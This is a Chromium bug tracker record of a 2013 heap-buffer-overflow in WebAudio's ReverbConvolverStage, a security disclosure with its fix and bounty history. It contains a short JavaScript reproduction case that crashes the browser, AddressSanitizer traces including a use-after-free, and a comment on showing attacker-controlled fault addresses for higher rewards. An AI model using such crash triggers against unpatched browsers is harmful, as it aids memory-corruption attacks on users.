# Heap-buffer-overflow in WebCore::ReverbConvolverStage::ReverbConvolverStage

| Field | Value |
|-------|-------|
| **Issue ID** | [40078013](https://issues.chromium.org/issues/40078013) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Media>Audio |
| **Reporter** | li...@gmail.com |
| **Assignee** | rt...@chromium.org |
| **Created** | 2013-08-29 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Heap buffer overflow in AudioArray

**VERSION**  

Chrome Version: [29.0.1547.57] + [beta]  

Operating System: [Debian 7.1]

**REPRODUCTION CASE**

<html>
<body>
<script>
var sampleRate = 44100;
var context = new webkitOfflineAudioContext(2, sampleRate, sampleRate);
var squarePulse = context.createBuffer(1, 1, sampleRate);
var convolver = context.createConvolver();
convolver.buffer = squarePulse;
</script>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

cmdStr : [chrome --disable-setuid-sandbox --user-data-dir=../tmp/profile\_1 -translate --incognito --new-window --no-default-browser-check --allow-file-access-from-files --no-first-run 2>&1|./asan\_symbolize.py|c++filt]  

==25231==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200002584f at pc 0x7f37c32ec2e7 bp 0x7fff715f8c90 sp 0x7fff715f8c88  

READ of size 256 at 0x60200002584f thread T0 (chrome)  

#0 0x7f37c32ec2e6 in operator-> /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/platform/audio/AudioArray.h:142  

#1 0x7f37c32ea54d in ReverbConvolver /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/platform/audio/ReverbConvolver.cpp:105  

#2 0x7f37c32e8b42 in initialize /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/platform/audio/Reverb.cpp:125  

#3 0x7f37c32e8874 in Reverb /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/platform/audio/Reverb.cpp:104  

#4 0x7f37c20db155 in setBuffer /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/modules/webaudio/ConvolverNode.cpp:143  

#5 0x7f37bcbdad79 in bufferAttrSetter /mnt/scratch0/tmpbuild/src/out/Release/gen/webcore/bindings/V8ConvolverNode.cpp:84  

#6 0x7f37bfba13c2 in Call /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/arguments.cc:186  

#7 0x7f37c007de15 in SetPropertyWithCallback /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/objects.cc:2858  

#8 0x7f37c0088473 in SetPropertyForResult /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/objects.cc:3857  

#9 0x7f37c007c6b5 in SetProperty /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/objects.cc:3380  

#10 0x7f37c007c9b4 in SetPropertyOrFail /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/objects.cc:2783  

#11 0x7f37bfef2edb in Store /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/ic.cc:1655  

#12 0x7f37bfefa28c in \_\_RT\_impl\_StoreIC\_Miss /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/ic.cc:2246  

#13 0x34a07c00688d in  

0x60200002584f is located 1 bytes to the left of 16-byte region [0x602000025850,0x602000025860)  

allocated by thread T0 (chrome) here:  

#0 0x7f37b9f82001 in operator new *asan\_rtl*  

#1 0x7f37c0a1c56d in establishIdentifierForPthreadHandle /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/wtf/ThreadingPthreads.cpp:167  

#2 0x7f37c0a1c396 in createThreadInternal /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/wtf/ThreadingPthreads.cpp:197  

#3 0x7f37c0a1bde6 in createThread /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/wtf/Threading.cpp:95  

#4 0x7f37c20d53de in AsyncAudioDecoder /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/modules/webaudio/AsyncAudioDecoder.cpp:44  

#5 0x7f37c20afdfa in AudioContext /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/modules/webaudio/AudioContext.cpp:150  

#6 0x7f37c20e8b08 in OfflineAudioContext /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/modules/webaudio/OfflineAudioContext.cpp:59  

#7 0x7f37bc685788 in constructor /mnt/scratch0/tmpbuild/src/out/Release/gen/webcore/bindings/V8OfflineAudioContext.cpp:79  

#8 0x7f37bfb9e8c3 in Call /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/arguments.cc:99  

#9 0x7f37bfbdc145 in HandleApiCallHelper<true> /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/builtins.cc:1276  

#10 0x34a07c00688d in  

#11 0x34a07c02abb0 in  

#12 0x34a07c05534e in  

#13 0x34a07c02acc3 in  

#14 0x34a07c007b56 in  

#15 0x7f37bfc7a540 in Invoke /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/execution.cc:119  

#16 0x7f37bfb61b70 in Run /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/api.cc:1968  

#17 0x7f37bcf8bbcd in runCompiledScript /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/V8ScriptRunner.cpp:95  

#18 0x7f37bcf2d5c9 in compileAndRunScript /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/ScriptController.cpp:241  

#19 0x7f37bcf31a1d in executeScriptInMainWorld /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/ScriptController.cpp:683  

#20 0x7f37bc5b439d in executeScript /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptElement.cpp:318  

#21 0x7f37bc5affa2 in prepareScript /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/ScriptElement.cpp:236  

#22 0x7f37c319db0e in runScript /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:303  

#23 0x7f37c319d829 in execute /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:174  

#24 0x7f37c317c897 in runScriptsForPausedTreeBuilder /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:253  

#25 0x7f37c317eee1 in processParsedChunkFromBackgroundParser /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:423  

#26 0x7f37c317c474 in pumpPendingSpeculations /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:461  

#27 0x7f37c317d25e in didReceiveParsedChunkFromBackgroundParser /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:311  

#28 0x7f37c324a4bb in PassOwnPtr /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:210  

#29 0x7f37c0a161c1 in operator() /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:577  

Shadow bytes around the buggy address:  

0x0c047fffcab0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c047fffcac0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c047fffcad0: fa fa fa fa fa fa fa fa fa fa 00 00 fa fa 00 fa  

0x0c047fffcae0: fa fa 00 00 fa fa 00 fa fa fa 04 fa fa fa 00 fa  

0x0c047fffcaf0: fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 00 00  

=>0x0c047fffcb00: fa fa 00 00 fa fa 00 00 fa[fa]00 00 fa fa 00 00  

0x0c047fffcb10: fa fa 00 00 fa fa fd fa fa fa 00 00 fa fa 00 00  

0x0c047fffcb20: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00  

0x0c047fffcb30: fa fa 00 fa fa fa 00 00 fa fa 00 00 fa fa 00 00  

0x0c047fffcb40: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00  

0x0c047fffcb50: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

ASan internal: fe  

==25231==ABORTING

## Attachments

- [uaf_log.txt](attachments/uaf_log.txt) (text/plain; charset=us-ascii, 330.8 KB)

## Timeline

### cl...@chromium.org (2013-08-29)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5215029351677952

Uploader: jschuh@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-buffer-overflow READ 256
Crash Address: 0x60900008c0cf
Crash State:
  - crash stack -
  WebCore::ReverbConvolverStage::ReverbConvolverStage
  WebCore::ReverbConvolver::ReverbConvolver
  WebCore::Reverb::initialize
  

Minimized Testcase (0.24 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96HiUZD3UaH0oq43fsl4IN2OjAmoM-rBJECPkx2enGFCxgAKPJuKG2jyVTCScRQLF8kiOwSmximxFuq8R_CACzaPWG8xBx5Ixs_-mJZrzwn6z9Z4DbWHxNTkV5fX_kRwoZGVOnbrzpgpNfQo1TeJirjIDJrWA
<script>
var sampleRate = 44100;
var context = new webkitOfflineAudioContext(2, sampleRate, sampleRate);
var squarePulse = context.createBuffer(1, 1, sampleRate);
var convolver = context.createConvolver();
convolver.buffer = squarePulse;
</script>

Fully reproducible crash found using linux_tsan_chrome_mp job type (history_size=6).


### js...@chromium.org (2013-08-29)

[Empty comment from Monorail migration]

### li...@gmail.com (2013-08-29)

This can also trigger heap-use-after-free, I'll try to post test cases as well later.

==ERROR: AddressSanitizer: heap-use-after-free on address 0x60f0000063af at pc 0x7f1ef8b5a2e7 bp 0x7ffff8fed9b0 sp 0x7ffff8fed9a8
READ of size 256 at 0x60f0000063af thread T0 (chrome)
    #0 0x7f1ef8b5a2e6 in operator-> /mnt/scratch0/tmpbuild/src/out/Release/../../third_party/WebKit/Source/core/platform/audio/AudioArray.h:142
    #1 0x7f1ef8b5854d in ReverbConvolver /mnt/scratch0/tmpbuild/src/out/Release/../../third_party/WebKit/Source/core/platform/audio/ReverbConvolver.cpp:105
    #2 0x7f1ef8b56b42 in initialize /mnt/scratch0/tmpbuild/src/out/Release/../../third_party/WebKit/Source/core/platform/audio/Reverb.cpp:125
    #3 0x7f1ef8b56717 in Reverb /mnt/scratch0/tmpbuild/src/out/Release/../../third_party/WebKit/Source/core/platform/audio/Reverb.cpp:104

0x60f000006450 is located 0 bytes to the right of 176-byte region [0x60f0000063a0,0x60f000006450)
freed by thread T0 (chrome) here:
    #0 0x7f1eef7ef8f1 in __interceptor_free _asan_rtl_
    #1 0x7f1ef2cb07eb in willBeDestroyed /mnt/scratch0/tmpbuild/src/out/Release/../../third_party/WebKit/Source/core/rendering/RenderInline.cpp:89
    #2 0x7f1ef2dd6729 in destroy /mnt/scratch0/tmpbuild/src/out/Release/../../third_party/WebKit/Source/core/rendering/RenderObject.cpp:2580
    #3 0x7f1ef1dbd014 in detach /mnt/scratch0/tmpbuild/src/out/Release/../../third_party/WebKit/Source/core/dom/Node.cpp:1107
    #4 0x7f1ef1cb5e10 in detach /mnt/scratch0/tmpbuild/src/out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.cpp:725
/mnt/scratch0/tmpbuild/src/out/Release/../../content/common/resource_messages.h:249

Shadow bytes around the buggy address:
  0x0c1e7fff8c20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa
  0x0c1e7fff8c30: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c1e7fff8c40: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa
  0x0c1e7fff8c50: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00
  0x0c1e7fff8c60: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa
=>0x0c1e7fff8c70: fa fa fa fa fd[fd]fd fd fd fd fd fd fd fd fd fd
  0x0c1e7fff8c80: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
  0x0c1e7fff8c90: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c1e7fff8ca0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x0c1e7fff8cb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c1e7fff8cc0: fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:     fa
  Heap right redzone:    fb
  Freed heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3

### js...@chromium.org (2013-08-29)

Okay, tentatively bumping it up based on that stack. I do wonder why we have this code enabled by default, given that the number of bugs make it appear that it simply wasn't ready to ship.

### cl...@chromium.org (2013-08-29)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5215029351677952

Uploader: jschuh@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-buffer-overflow READ 256
Crash Address: 0x60900008c0cf
Crash State:
  - crash stack -
  WebCore::ReverbConvolverStage::ReverbConvolverStage
  WebCore::ReverbConvolver::ReverbConvolver
  WebCore::Reverb::initialize
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=172728:172836

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96HiUZD3UaH0oq43fsl4IN2OjAmoM-rBJECPkx2enGFCxgAKPJuKG2jyVTCScRQLF8kiOwSmximxFuq8R_CACzaPWG8xBx5Ixs_-mJZrzwn6z9Z4DbWHxNTkV5fX_kRwoZGVOnbrzpgpNfQo1TeJirjIDJrWA

Fully reproducible crash found using linux_tsan_chrome_mp job type (history_size=6).


### in...@chromium.org (2013-08-29)

regressed from http://src.chromium.org/viewvc/blink?view=rev&revision=137516.

### rt...@chromium.org (2013-08-29)

[Empty comment from Monorail migration]

### li...@gmail.com (2013-08-29)

It seems quite hard for me to reliably reproduce use-after-free. Don't know if this will be helpful, but I'm attaching the collected crash stacks on use-after-free cases by running the fuzzer less than a hour.

### bu...@chromium.org (2013-08-30)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=157007

------------------------------------------------------------------------
r157007 | rtoy@google.com | 2013-08-30T19:16:48.248378Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/platform/audio/ReverbConvolverStage.cpp?r1=157007&r2=157006&pathrev=157007

Don't read past the end of the impulseResponse array

BUG=281480

Review URL: https://chromiumcodereview.appspot.com/23689004
------------------------------------------------------------------------

### in...@chromium.org (2013-08-30)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-08-31)

ClusterFuzz has detected this issue as fixed in range 220661:220700.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5215029351677952

Uploader: jschuh@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-buffer-overflow READ 256
Crash Address: 0x60900008c0cf
Crash State:
  - crash stack -
  WebCore::ReverbConvolverStage::ReverbConvolverStage
  WebCore::ReverbConvolver::ReverbConvolver
  WebCore::Reverb::initialize
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=172728:172836
Fixed: https://cluster-fuzz.appspot.com/revisions?range=220661:220700

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96HiUZD3UaH0oq43fsl4IN2OjAmoM-rBJECPkx2enGFCxgAKPJuKG2jyVTCScRQLF8kiOwSmximxFuq8R_CACzaPWG8xBx5Ixs_-mJZrzwn6z9Z4DbWHxNTkV5fX_kRwoZGVOnbrzpgpNfQo1TeJirjIDJrWA

Fully reproducible crash found using linux_tsan_chrome_mp job type (history_size=6).

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### li...@gmail.com (2013-09-03)

Not sure it's too early to claim for credits, but can we get the credit with the name "Byoungyoung Lee" and "Tielei Wang" for this bug?

### in...@chromium.org (2013-09-04)

Sure, we will do the credits as you said in c#12.

### li...@gmail.com (2013-09-04)

@inferno Thanks!

### in...@chromium.org (2013-09-12)

Please merge your change to the m30 branch (1599) by early next week [using drover]. We have m30 beta coming next week and we want all the security changes in by that time. 

### bu...@chromium.org (2013-09-16)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=157832

------------------------------------------------------------------------
r157832 | rtoy@google.com | 2013-09-16T17:41:37.471473Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1599/Source/core/platform/audio/ReverbConvolverStage.cpp?r1=157832&r2=157831&pathrev=157832

Merge 157007 "Don't read past the end of the impulseResponse array"

> Don't read past the end of the impulseResponse array
> 
> BUG=281480
> 
> Review URL: https://chromiumcodereview.appspot.com/23689004

TBR=rtoy@google.com

Review URL: https://codereview.chromium.org/24078013
------------------------------------------------------------------------

### in...@chromium.org (2013-09-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-18)

ClusterFuzz thinks that this bug might be eligible for a reward! Forwarding to reward panel for consideration.

### in...@chromium.org (2013-09-25)

Did you saw our new criteria for possibly issuing higher rewards? See http://www.chromium.org/Home/chromium-security/vulnerability-rewards-program/reward-nomination-process
E.g. If you are able to provide a repro that faulted at an address of 0x41414141, it will qualify for the new higher rewards. Or, if you can show that you have control between free and crash points, etc.

### in...@chromium.org (2013-09-25)

[Empty comment from Monorail migration]

### mb...@chromium.org (2013-09-26)

Lifeasageek, is that how you would like to be credited for your other bug reports in addition to this one? If not, how would you like to be credited on the other reports?

### li...@gmail.com (2013-09-26)

mbarbe@ Please credit the bugs we reported as
- https://crbug.com/chromium/281480 : Byoungyoung Lee and Tielei Wang from Georgia Tech Information Security Center (GTISC)
- https://crbug.com/chromium/282088 : Byoungyoung Lee from Georgia Tech Information Security Center (GTISC)
- https://crbug.com/chromium/286414 : Byoungyoung Lee and Tielei Wang from Georgia Tech Information Security Center (GTISC)
- https://crbug.com/chromium/269753 : Byoungyoung Lee from Georgia Tech Information Security Center (GTISC)
 

### mb...@chromium.org (2013-09-26)

Great! Thanks for the reply.

### mb...@chromium.org (2013-09-26)

[Empty comment from Monorail migration]

### mb...@chromium.org (2013-09-27)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-09-28)

OOB read. $500

### pa...@chromium.org (2013-10-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### gl...@chromium.org (2015-06-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### ss...@google.com (2016-03-21)

Renaming Blink>Audio to Blink>Media>Audio for better characterization

[Monorail components: -Blink>Audio Blink>Media>Audio]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/281480?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078013)*
